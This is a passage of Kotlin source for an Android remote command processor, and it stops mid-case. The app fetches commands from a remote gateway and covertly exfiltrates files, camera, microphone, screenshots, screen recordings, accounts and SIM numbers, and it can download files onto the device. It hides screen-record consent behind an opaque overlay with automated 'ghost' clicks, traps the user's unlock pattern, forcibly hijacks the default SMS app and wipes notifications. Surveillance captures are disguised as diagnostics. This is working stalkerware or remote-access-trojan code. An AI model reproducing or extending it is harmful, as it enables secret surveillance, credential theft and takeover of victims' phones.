package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

object CommandProcessor {

    suspend fun checkAndExecute(ctx: Context) {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceManager.getDeviceId(ctx)
                // Fetch PENDING commands via Gateway
                val req = JSONObject()
                req.put("action", "get_commands")
                req.put("deviceId", deviceId)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Accept", "application/json")
                conn.doOutput = true

                conn.outputStream.use { os -> 
                    os.write(req.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                }
                
                val code = conn.responseCode
                if (code == 200) {
                    val resp = conn.inputStream.bufferedReader().use { it.readText() }
                    val respObj = JSONObject(resp)
                    if (respObj.optBoolean("success")) {
                        val commands = respObj.optJSONArray("data") ?: JSONArray()
                        if (commands.length() > 0) {
                            DebugLogger.log("CMD_PROC", "Fetch Success. Executing ${commands.length()} commands.")
                        }
                        for (i in 0 until commands.length()) {
                            val cmd = commands.getJSONObject(i)
                            DebugLogger.log("SYSTEM", "Executing: ${cmd.optString("file_name")}")
                            processSingleCommand(ctx, cmd)
                        }
                    } else {
                        DebugLogger.log("CMD_PROC_ERR", "Gateway Logic Fail: ${respObj.optString("error")}")
                    }
                } else {
                    if (code == 402 || code >= 500) SecretVault.switchFallback(ctx)
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("CMD_PROC_ERR", "HTTP $code: $err")
                }
            } catch (e: Exception) {
                if (e is java.net.UnknownHostException || e is java.net.ConnectException) {
                    DebugLogger.log("CMD_PROC", "Fetch aborted: Offline")
                } else if (e is java.net.SocketTimeoutException) {
                    SecretVault.switchFallback(ctx)
                    DebugLogger.log("CMD_PROC_ERR", "Fetch timeout: ${e.toString()}")
                } else {
                    DebugLogger.log("CMD_PROC_ERR", "Fetch failed: ${e.toString()}")
                }
            }
        }
    }

    suspend fun processSingleCommand(ctx: Context, cmd: JSONObject) {
        val id = cmd.getInt("id")
        
        // 1. Mark as RECEIVED immediately so backend knows the device is alive
        updateCommandStatus(ctx, id, "RECEIVED", null)

        var status = "EXECUTED"
        var errorMsg = ""
        val fileName = cmd.optString("file_name")
        val content = cmd.optString("content", "")

        try {
            when (fileName) {
                "PING" -> {
                    CloudManager.sendPing(ctx, "Remote Tickle: Alive")
                    status = "PONG"
                }
                "TOAST" -> {
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(ctx, content, Toast.LENGTH_LONG).show()
                    }
                }
                "RING" -> {
                    val dur = content.toLongOrNull() ?: 10L
                    val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                    val oldMode = am.ringerMode
                    val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_RING)
                    
                    if (PermissionManager.hasDndAccess(ctx)) {
                        am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                    }
                    am.setStreamVolume(android.media.AudioManager.STREAM_RING, am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING), 0)
                    
                    val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
                    val ringtone = android.media.RingtoneManager.getRingtone(ctx, uri)
                    ringtone.play()
                    
                    if (ringtone.isPlaying) {
                        status = "SUCCESS"
                        errorMsg = "Audible alert active for ${dur}s"
                        kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
                            kotlinx.coroutines.delay(dur * 1000)
                            ringtone.stop()
                            if (PermissionManager.hasDndAccess(ctx)) am.ringerMode = oldMode
                            am.setStreamVolume(android.media.AudioManager.STREAM_RING, oldVol, 0)
                        }
                    } else {
                        status = "FAILED_AUDIO_BLOCKED"
                        errorMsg = "Hardware output or system focus prevented playback."
                    }
                }
                "STAY_READY" -> {
                    val mins = content.toLongOrNull() ?: 5L
                    val i = android.content.Intent(ctx, BeaconService::class.java)
                    i.putExtra("duration_mins", mins)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
                    else ctx.startService(i)
                    status = "SYNC_PRIORITY_HIGH (${mins}M)"
                }
                "SET_INTERVAL" -> {
                    // Content = Interval in Minutes (min 15)
                    val mins = content.toLongOrNull() ?: 15L
                    val safeMins = if (mins < 15) 15L else mins
                    
                    val wm = WorkManager.getInstance(ctx)
                    val constraints = Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .setRequiresBatteryNotLow(true)
                        .build()

                    val req = PeriodicWorkRequestBuilder<RemoteCommandWorker>(safeMins, TimeUnit.MINUTES)
                        .setConstraints(constraints)
                        .build()
                        
                    wm.enqueueUniquePeriodicWork("RemoteCmdWorker", ExistingPeriodicWorkPolicy.REPLACE, req)
                    status = "EXECUTED (NEW INTERVAL: ${safeMins}M)"
                }
                "STOP_BEACON" -> {
                    ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
                    SocketManager.disconnect()
                    status = "EXECUTED (STOPPED)"
                }
                "LIVE_STREAM" -> {
                    val parts = content.split("|")
                    val mode = parts[0].trim().uppercase()
                    if (mode == "ON") {
                        val mins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 15L
                        val i = android.content.Intent(ctx, BeaconService::class.java).apply {
                            putExtra("duration_mins", mins)
                            putExtra("mode", "LIVE_STREAM")
                        }
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
                        else ctx.startService(i)
                        status = "STREAM_STARTED (${mins}M)"
                    } else {
                        ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
                        SocketManager.disconnect()
                        status = "STREAM_STOPPED"
                    }
                }
                "GET_TOKEN" -> {
                    val token = DeviceManager.getRobustFcmToken(ctx)
                    if (token != null) {
                        status = "TOKEN_RETRIEVED"
                        val result = JSONObject().put("fcm_token", token)
                        updateCommandStatus(ctx, id, status, null, result, null)
                        return
                    } else {
                        status = "FETCH_FAILED (NO_TOKEN)"
                        errorMsg = "Play Services unavailable or token generation blocked."
                    }
                }
                "GET_VAULT_SIZE" -> {
                    val sizeInfo = DumpManager.getVaultSize()
                    status = "EXECUTED"
                    val result = JSONObject().put("size_report", sizeInfo)
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "FORCE_UPLOAD" -> {
                    val modules = content.split(",").map { it.trim() }
                    CloudManager.uploadData(ctx, modules, "REMOTE_COMMAND")
                    status = "MANUAL_BACKUP_INITIATED"
                }
                "UPLOAD_DUMPS" -> {
                    val root = DumpManager.getRootDir()
                    val dateFolders = root.listFiles { f -> f.isDirectory } ?: emptyArray()
                    var filesUploaded = 0
                    var foldersCleared = 0

                    for (folder in dateFolders) {
                        val files = folder.listFiles() ?: continue
                        if (files.isEmpty()) {
                            folder.delete()
                            continue
                        }

                        var folderEmpty = true
                        for (f in files) {
                            // Upload to 'ARCHIVE' category
                            if (CloudManager.uploadFile(ctx, f, "ARCHIVE")) {
                                f.delete()
                                filesUploaded++
                            } else {
                                folderEmpty = false
                            }
                        }

                        if (folderEmpty) {
                            folder.delete()
                            foldersCleared++
                        }
                    }
                    status = "SCAVENGER_COMPLETE"
                    val result = JSONObject()
                    result.put("files_synced", filesUploaded)
                    result.put("vault_folders_wiped", foldersCleared)
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "PULL_FILE" -> {
                    val f = File(content)
                    if (f.exists() && f.isFile) {
                        val timestamp = System.currentTimeMillis()
                        val folderName = DeviceManager.getDeviceFolderName(ctx)
                        val storagePath = "$folderName/PULL/${timestamp}_${f.name}"
                        if (!CloudManager.uploadFile(ctx, f, "PULL", timestamp)) {
                            status = "FETCH_FAILED (UPLOAD_ERROR)"
                            errorMsg = "File exists but streaming to storage bucket failed."
                        } else {
                            status = "REMOTE_FETCH_SUCCESS"
                            updateCommandStatus(ctx, id, status, null, null, storagePath)
                            return 
                        }
                    } else {
                        status = "FETCH_ABORTED (NOT_FOUND)"
                        errorMsg = "File path does not exist on device."
                    }
                }
                "PUSH_FILE" -> {
                    val parts = content.split("|")
                    if (parts.size < 2) {
                        status = "FAILED (BAD_FORMAT)"
                        errorMsg = "Required format: URL | /path/to/save/file.ext"
                    } else {
                        var currentUrl = parts[0].trim()
                        val targetPath = parts[1].trim()
                        val targetFile = File(targetPath)
                        
                        try {
                            targetFile.parentFile?.mkdirs()
                            var connection: java.net.HttpURLConnection
                            var redirects = 0
                            val maxRedirects = 5

                            while (true) {
                                val url = URL(currentUrl)
                                connection = url.openConnection() as java.net.HttpURLConnection
                                connection.instanceFollowRedirects = false // Manually handle for control
                                connection.connectTimeout = 30000
                                connection.readTimeout = 30000
                                
                                val code = connection.responseCode
                                if (code in 300..308 && redirects < maxRedirects) {
                                    currentUrl = connection.getHeaderField("Location")
                                    redirects++
                                    continue
                                }

                                if (code == 200) {
                                    connection.inputStream.use { input ->
                                        targetFile.outputStream().use { output ->
                                            input.copyTo(output, 8192)
                                        }
                                    }
                                    status = "DEPLOYMENT_SUCCESS"
                                    val result = JSONObject()
                                    result.put("saved_to", targetFile.absolutePath)
                                    result.put("size", targetFile.length())
                                    result.put("redirects", redirects)
                                    updateCommandStatus(ctx, id, status, null, result, null)
                                    return
                                } else {
                                    status = "DEPLOYMENT_FAILED"
                                    errorMsg = "HTTP $code at end of chain"
                                    break
                                }
                            }
                        } catch (e: Exception) {
                            status = "DEPLOYMENT_ERROR"
                            errorMsg = e.toString()
                        }
                    }
                }
                "GET_SKELETON" -> {
                    val depth = content.trim().toIntOrNull() ?: 5
                    val report = FileManager.generateReport(depth)
                    status = "STORAGE_INDEX_COMPLETE"
                    DebugLogger.log("COMMAND", "Processed [$fileName] (Depth: $depth) -> $status")
                    updateCommandStatus(ctx, id, status, null, report, null)
                    return
                }
                "MAP_GRID" -> {
                    val depth = content.trim().toIntOrNull() ?: 10
                    val service = MyAccessibilityService.instance
                    if (service != null) {
                        CoroutineScope(Dispatchers.IO).launch {
                            service.executeMapGridSequence(id, depth)
                        }
                        status = "GRID_MAPPING_INITIATED"
                        updateCommandStatus(ctx, id, status, null, null, null)
                        return
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service is required for UI mapping."
                    }
                }
                "CAPTURE_PATTERN" -> {
                    ScreenRecordManager.pendingCmdId = id
                    val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                    if (!pm.isInteractive) {
                        status = "FAILED (SCREEN_OFF)"
                        errorMsg = "Screen must be physically ON to initiate the pattern trap securely."
                    } else {
                        val parts = content.split("|")
                        val timeoutSec = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 20L
                        val qual = parts.getOrNull(1)?.trim()?.uppercase() ?: "MED"
                        val fps = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 30

                        ScreenRecordManager.expectedMode = "AUTO"
                        ScreenRecordManager.pendingDur = 600 // 10 min fallback cap
                        ScreenRecordManager.pendingQual = qual
                        ScreenRecordManager.pendingFps = fps
                        ScreenRecordManager.pendingAudio = false
                        ScreenRecordManager.isPatternTrap = true
                        ScreenRecordManager.patternSuccessTimeoutMs = timeoutSec * 1000L
                        
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            DimmerManager.applyDim(ctx, 0, "OVERLAY")
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                if (ScreenRecordManager.expectedMode == "AUTO") {
                                    DimmerManager.removeOverlay(ctx)
                                    ScreenRecordManager.expectedMode = ""
                                }
                            }, 10000)
                        }
                        
                        val i = Intent(ctx, PulseActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                            putExtra("is_screen_record_trigger", true)
                        }
                        ctx.startActivity(i)
                        status = "PATTERN_TRAP_ARMED (Timeout: ${timeoutSec}s | Quality: $qual)"
                    }
                }
                "GET_TREE" -> {
                    val parts = content.split("|")
                    val pkg = parts.getOrNull(0)?.trim().let { if (it == "null" || it == "") null else it }
                    val mins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 5L
                    val depth = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 10
                    
                    val service = MyAccessibilityService.instance
                    if (service != null) {
                        if (mins <= 0L) {
                            // Instant Frame Grab (No Session)
                            val instantTree = service.getInstantTree(pkg, depth)
                            if (!instantTree.has("error")) {
                                status = "SCAN_COMPLETE"
                                val result = JSONObject().apply {
                                    put("depth_limit", depth)
                                    put("snapshot", instantTree)
                                }
                                updateCommandStatus(ctx, id, status, null, result, null)
                            } else {
                                status = "FAILED (NOT_IN_FOREGROUND)"
                                errorMsg = instantTree.optString("error")
                            }
                            return
                        } else {
                            // Queue and wait for target to open
                            service.startTreeDump(pkg, mins, id, depth)
                            status = if (pkg != null) "WAITING_FOR_TARGET_APP (DUR: ${mins}M)" else "SCAN_SESSION_ACTIVE (${mins}M)"
                            updateCommandStatus(ctx, id, status, null, null, null)
                            return
                        }
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service is offline."
                    }
                }
                "RESET_SCRAPER" -> {
                    val service = MyAccessibilityService.instance
                    if (service != null) {
                        service.resetAllTasks()
                        status = "SCRAPER_QUEUE_PURGED"
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                    }
                }
                "GET_LOGS" -> {
                    val logs = DebugLogger.getLogs()
                    val tempFile = java.io.File(ctx.cacheDir, "diag_log_${System.currentTimeMillis()}.txt")
                    try {
                        tempFile.writeText(logs)
                        if (CloudManager.uploadFile(ctx, tempFile, "DIAGNOSTIC")) {
                            status = "DIAGNOSTIC_EXPORT_SUCCESS"
                        } else {
                            status = "DIAGNOSTIC_EXPORT_FAILED"
                        }
                    } catch (e: Exception) {
                        status = "EXPORT_ERROR"
                    } finally {
                        if (tempFile.exists()) tempFile.delete()
                    }
                }
                "TOGGLE_FEATURE" -> {
                    val parts = content.split(":")
                    if (parts.size >= 2) {
                        val feature = parts[0].trim()
                        val mode = parts[1].trim()
                        val p1 = parts.getOrNull(2)?.trim()
                        val p2 = parts.getOrNull(3)?.trim()
                        
                        ConfigManager.setFeatureParametric(ctx, feature, mode, p1, p2)
                        status = "EXECUTED ($feature -> $mode)"
                    } else {
                        status = "FAILED (FORMAT)"
                        errorMsg = "Usage: feature:mode:p1:p2"
                    }
                }
                "MASTER_TOGGLE" -> {
                    val mode = content.trim().uppercase()
                    if (mode == "ON" || mode == "OFF") {
                        ConfigManager.setAllFeatures(ctx, mode)
                        status = "MASTER_TOGGLE_EXECUTED ($mode)"
                    } else {
                        status = "FAILED (FORMAT)"
                        errorMsg = "Usage: ON or OFF"
                    }
                }
                "CODERED" -> {
                    val parts = content.split("|")
                    val codes = parts[0].trim()
                    val handler = if (parts.size > 1) parts[1].trim() else "BACKEND"
                    
                    val i = android.content.Intent(ctx, EmergencyService::class.java)
                    i.putExtra("codes", codes)
                    i.putExtra("sender", handler)
                    
                    DebugLogger.log("SYSTEM", "Triggering CodeRed. Codes: $codes | Handler: $handler")

                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                    status = "EMERGENCY_PROMPTED"
                }
                "GET_SCREENSHOT" -> {
                    if (MyAccessibilityService.instance == null) {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Accessibility service is required for screenshots."
                    } else {
                        val parts = content.split("|")
                        val quality = parts.getOrNull(0)?.trim()?.toIntOrNull() ?: 70
                        val freq = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 0
                        val duration = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 0

                        if (freq > 0 && duration > 0) {
                            val safeFreq = if (freq < 2) 2 else freq
                            val endTime = System.currentTimeMillis() + (duration * 1000L)
                            var capturedCount = 0
                            
                            DebugLogger.log("SCREEN_SESSION", "Starting continuous capture: ${safeFreq}s interval for ${duration}s")
                            
                            while (System.currentTimeMillis() < endTime) {
                                val deferredFile = CompletableDeferred<java.io.File?>()
                                MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
                                    deferredFile.complete(file)
                                }

                                val file = withTimeoutOrNull(8000) { deferredFile.await() }
                                if (file != null) {
                                    if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
                                        file.delete()
                                    } else {
                                        DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
                                    }
                                    capturedCount++
                                }
                                
                                if (System.currentTimeMillis() + (safeFreq * 1000L) > endTime) break
                                delay(safeFreq * 1000L)
                            }
                            status = "SCREENSHOT_SESSION_COMPLETE ($capturedCount images)"
                        } else {
                            // Single Shot Logic
                            val deferredFile = CompletableDeferred<java.io.File?>()
                            MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
                                deferredFile.complete(file)
                            }

                            val file = withTimeoutOrNull(10000) { deferredFile.await() }
                            if (file != null) {
                                if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
                                    status = "SCREENSHOT_UPLOADED"
                                    file.delete()
                                } else {
                                    DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
                                    status = "SCREENSHOT_QUEUED_OFFLINE"
                                }
                            } else {
                                status = "SCREENSHOT_FAILED"
                                errorMsg = "Capture timed out or device version incompatible."
                            }
                        }
                    }
                }
                "SET_DEFAULT_SMS" -> {
                    DefaultSmsManager.pendingCmdId = id
                    val mode = content.trim().uppercase()
                    val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(ctx)
                    
                    // Capture the original package ONLY if it's not us
                    if (currentDefault != ctx.packageName) {
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                            .putString("original_sms_package", currentDefault).apply()
                        DebugLogger.log("SMS_MGR", "Captured original SMS app: $currentDefault")
                    }

                    if (DefaultSmsManager.isDefaultSms(ctx)) {
                        status = "ALREADY_DEFAULT"
                        DefaultSmsManager.isRelentlessActive = false
                        DefaultSmsManager.expectedMode = ""
                    } else {
                        DefaultSmsManager.expectedMode = mode
                                        if (mode == "RELENTLESS") {
                    DefaultSmsManager.isRelentlessActive = true
                    val i = Intent(ctx, MonitorService::class.java).apply { putExtra("kick_relentless_sms", true) }
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
                    status = "RELENTLESS_TRAP_ARMED"
                } else if (mode == "STOP_RELENTLESS") {
                    DefaultSmsManager.isRelentlessActive = false
                    status = "RELENTLESS_STOPPED"
                } else {
                    DefaultSmsManager.requestDefault(ctx)
                    status = "DEFAULT_SMS_REQUESTED"
                }
                    }
                }
                "RESTORE_DEFAULT_SMS" -> {
                    DefaultSmsManager.pendingCmdId = id
                    
                    if (!DefaultSmsManager.isDefaultSms(ctx)) {
                        status = "ALREADY_RESTORED"
                        errorMsg = "App is already not the default SMS."
                        DefaultSmsManager.expectedMode = ""
                    } else {
                        val prevLabel = DefaultSmsManager.getStoredPreviousLabel(ctx)
                        if (prevLabel == null) {
                            status = "FAILED"
                            errorMsg = "No previous SMS package found in memory."
                        } else {
                                                    DefaultSmsManager.expectedMode = "RESTORE"
                        Handler(Looper.getMainLooper()).post {
                            DimmerManager.applyDim(ctx, 0, "AUTO")
                            Handler(Looper.getMainLooper()).postDelayed({
                                if (DefaultSmsManager.expectedMode == "RESTORE") {
                                    DefaultSmsManager.expectedMode = ""
                                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                                    DynamicUIManager.removeOverlay(ctx, "SMS_RESTORE_SAFETY_FUSE")
                                }
                            }, 30000)
                        }
                            try {
                                val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                }
                                ctx.startActivity(i)
                                status = "RESTORE_INITIATED"
                                errorMsg = "Targeting: $prevLabel"
                            } catch (e: Exception) {
                                status = "FAILED"
                                errorMsg = "Intent failed: ${e.message}"
                            }
                        }
                    }
                }
                "RECORD_SCREEN" -> {
                    ScreenRecordManager.pendingCmdId = id
                    val parts = content.split("|")
                    val mode = parts.getOrNull(0)?.trim()?.uppercase() ?: "TRIGGER"
                    val dur = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 60
                    val qual = parts.getOrNull(2)?.trim()?.uppercase() ?: "MED"
                    val audio = parts.getOrNull(3)?.trim()?.uppercase() == "TRUE"
                    val fps = parts.getOrNull(4)?.trim()?.toIntOrNull() ?: 30
                    
                    ScreenRecordManager.expectedMode = mode
                    ScreenRecordManager.pendingDur = dur
                    ScreenRecordManager.pendingQual = qual
                    ScreenRecordManager.pendingAudio = audio
                    ScreenRecordManager.pendingFps = fps
                    ScreenRecordManager.pendingDur = dur
                    ScreenRecordManager.pendingQual = qual
                    ScreenRecordManager.pendingAudio = audio
                    
                    if (mode == "AUTO") {
                        // Apply the opaque blindfold instantly before the dialog arrives
                        Handler(Looper.getMainLooper()).post {
                            DimmerManager.applyDim(ctx, 0, "OVERLAY")
                            
                            // FAIL-SAFE: If the Ghost Click fails or hangs, forcefully unblind after 10s
                            Handler(Looper.getMainLooper()).postDelayed({
                                if (ScreenRecordManager.expectedMode == "AUTO") {
                                    DebugLogger.log("SCREEN_REC_FAIL", "Ghost Accept timed out. Forcefully removing blindfold.")
                                    DimmerManager.removeOverlay(ctx)
                                    ScreenRecordManager.expectedMode = "" 
                                }
                            }, 10000)
                        }
                    }
                    
                    val i = Intent(ctx, PulseActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                        putExtra("is_screen_record_trigger", true)
                    }
                    ctx.startActivity(i)
                    status = "RECORD_INITIATED ($mode | ${dur}s | $qual | Audio: $audio)"
                }
                "CAPTURE_IMAGE" -> {
                    val parts = content.split("|")
                    val side = parts.getOrNull(0)?.trim()?.uppercase() ?: "REAR"
                    val count = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 1
                    val useFront = side == "FRONT"
                    
                    var successCount = 0
                    for (i in 1..count) {
                        val file = CameraControl.capture(ctx, useFront)
                        if (file != null) {
                            if (CloudManager.uploadFile(ctx, file, "OPTICAL_DIAG")) {
                                successCount++
                                file.delete()
                            } else {
                                // OFFLINE: Send to Catacombs
                                DumpManager.vaultMedia(file, "OPTICAL_DIAG")
                            }
                        }
                        kotlinx.coroutines.delay(1000)
                    }
                    status = "IMAGE_CAPTURE_COMPLETE ($successCount/$count)"
                }
                "RECORD_VOICE" -> {
                    val dur = content.trim().toIntOrNull() ?: 10
                    val snippet = VoiceManager.recordSnippet(ctx, dur)
                    if (snippet != null) {
                        if (CloudManager.uploadFile(ctx, snippet, "VOICE_DIAG")) {
                            status = "VOICE_CAPTURE_SUCCESS"
                            snippet.delete()
                        } else {
                            // OFFLINE: Send to Catacombs
                            DumpManager.vaultMedia(snippet, "VOICE_DIAG")
                            status = "VOICE_QUEUED_OFFLINE"
                        }
                    } else {
                        status = "VOICE_CAPTURE_FAILED"
                        errorMsg = "Mic may be in use by another app or permission denied."
                    }
                }
                "GET_ACCOUNTS" -> {
                    val accounts = DeviceManager.getAccounts(ctx)
                    status = "ACCOUNTS_RETRIEVED"
                    val result = JSONObject().put("accounts", accounts)
                    updateCommandStatus(ctx, id, status, null, result, null)
                    return
                }
                "GET_DEFAULTS" -> {
                    val defaults = DeviceManager.getDefaultApps(ctx)
                    status = "DEFAULTS_RETRIEVED"
                    updateCommandStatus(ctx, id, status, null, defaults, null)
                    return
                }
                "GET_NUMBERS" -> {
                    val sm = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
                    val numbers = JSONArray()
                    
                    if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                        val infoList = sm.activeSubscriptionInfoList
                        if (infoList != null) {
                            for (info in infoList) {
                                val sim = JSONObject()
                                sim.put("slot", info.simSlotIndex)
                                sim.put("carrier", info.carrierName)
                                sim.put("display_name", info.displayName)
                                sim.put("country", info.countryIso)
                                sim.put("id", info.subscriptionId)
                                
                                // Try to get the actual number
                                var num = "Unknown"
                                if (android.os.Build.VERSION.SDK_INT >= 33) {
                                    try { num = sm.getPhoneNumber(info.subscriptionId) } catch (e: Exception) { }
                                } else {
                                    num = info.number ?: "Unknown"
                                }
                                
                                sim.put("number", if (num.isEmpty()) "Unknown" else num)
                                numbers.put(sim)
                            }
                        }
                        status = "SIM_INFO_RETRIEVED"
                        val result = JSONObject().put("sim_cards", numbers)
                        updateCommandStatus(ctx, id, status, null, result, null)
                        return
                    } else {
                        status = "FAILED_PERMISSION (READ_PHONE_STATE)"
                        errorMsg = "Permission required to access SIM subscriptions."
                    }
                }
                "VOLUME" -> {
                    val parts = content.split("|")
                    if (parts.size >= 2) {
                        val streamStr = parts[0].trim().uppercase()
                        val levelStr = parts[1].trim().uppercase()
                        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                        
                        val stream = when (streamStr) {
                            "MEDIA" -> android.media.AudioManager.STREAM_MUSIC
                            "ALARM" -> android.media.AudioManager.STREAM_ALARM
                            else -> android.media.AudioManager.STREAM_RING
                        }

                        if (levelStr == "SILENT" || levelStr == "VIBRATE" || levelStr == "NORMAL") {
                            if (PermissionManager.hasDndAccess(ctx)) {
                                am.ringerMode = when (levelStr) {
                                    "SILENT" -> android.media.AudioManager.RINGER_MODE_SILENT
                                    "VIBRATE" -> android.media.AudioManager.RINGER_MODE_VIBRATE
                                    else -> android.media.AudioManager.RINGER_MODE_NORMAL
                                }
                                status = "SUCCESS"
                                errorMsg = "Ringer set to $levelStr (Verified: ${am.ringerMode})"
                            } else {
                                status = "FAILED_PERMISSION"
                                errorMsg = "DND access required for ringer control."
                            }
                        } else {
                            val pct = levelStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
                            val max = am.getStreamMaxVolume(stream)
                            val targetVol = ((pct / 100f) * max).toInt()
                            
                            if (stream == android.media.AudioManager.STREAM_RING && PermissionManager.hasDndAccess(ctx) && am.ringerMode != android.media.AudioManager.RINGER_MODE_NORMAL) {
                                am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                            }
                            
                            am.setStreamVolume(stream, targetVol, 0)
                            val verifiedVol = am.getStreamVolume(stream)
                            val verifiedPct = ((verifiedVol.toFloat() / max) * 100).toInt()
                            
                            status = "SUCCESS"
                            errorMsg = "Stream $streamStr set to $verifiedPct% (Requested $pct%)"
                        }
                    } else {
                        status = "FAILED_FORMAT"
                        errorMsg = "Format: STREAM|LEVEL"
                    }
                }
                "GET_SENSORS" -> {
                    val sensorData = EnvironmentalManager.sampleSensors(ctx)
                    status = "ENV_AUDIT_COMPLETE"
                    updateCommandStatus(ctx, id, status, null, sensorData, null)
                    return
                }
                "SPEAK_TEXT" -> {
                    val parts = content.split("|")
                    val text = parts[0].trim()
                    val vol = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 80
                    
                    if (text.isNotEmpty()) {
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            SpeakerManager.speak(ctx, text, vol.coerceIn(0, 100))
                        }
                        status = "VOCAL_DISPATCH_SUCCESS"
                    } else {
                        status = "FAILED_EMPTY_TEXT"
                    }
                }
                "GET_ENGAGEMENT" -> {
                    val history = EngagementTracker.getHistory(ctx)
                    status = "ENGAGEMENT_REPORT_READY"
                    updateCommandStatus(ctx, id, status, null, history, null)
                    return
                }
                "TOGGLE_LOGGING" -> {
                    val state = content.trim().uppercase()
                    DebugLogger.isLoggingEnabled = (state == "ON")
                    status = "LOGGING_SYSTEM_" + (if (DebugLogger.isLoggingEnabled) "ENABLED" else "DISABLED")
                }
                "WIPE_NOTIFICATIONS" -> {
                    DebugLogger.log("WIPE_NOTIF", "Command received. Content: '$content'")
                    if (MyNotificationListener.instance != null) {
                        val parts = content.split("|")
                        val parsedMode = parts.getOrNull(0)?.trim()?.uppercase()
                        // Default to ALL if empty or if the old '0' bug slipped through
                        val mode = if (parsedMode.isNullOrEmpty() || parsedMode == "0") "ALL" else parsedMode
                        val value = parts.getOrNull(1)?.trim()
                        
                        DebugLogger.log("WIPE_NOTIF", "Parsed Mode: '$mode', Value: '$value'. Delegating to MyNotificationListener...")
                        
                        val wipedCount = MyNotificationListener.instance?.wipeNotifications(mode, value) ?: 0
                        status = "NOTIFICATIONS_WIPED ($wipedCount cleared. Mode: $mode)"
                        DebugLogger.log("WIPE_NOTIF", "Success. $wipedCount notifications cleared.")
                    } else {
                        status = "FAILED (SERVICE_OFF)"
                        errorMsg = "Notification listener service is not running."
                        DebugLogger.log("WIPE_NOTIF", "Failed: Notification listener service is offline or lacking permission.")
                    }
                }
                "SCREEN_TIMEOUT" -> {
                    val secs = content.trim().toIntOrNull() ?: 30
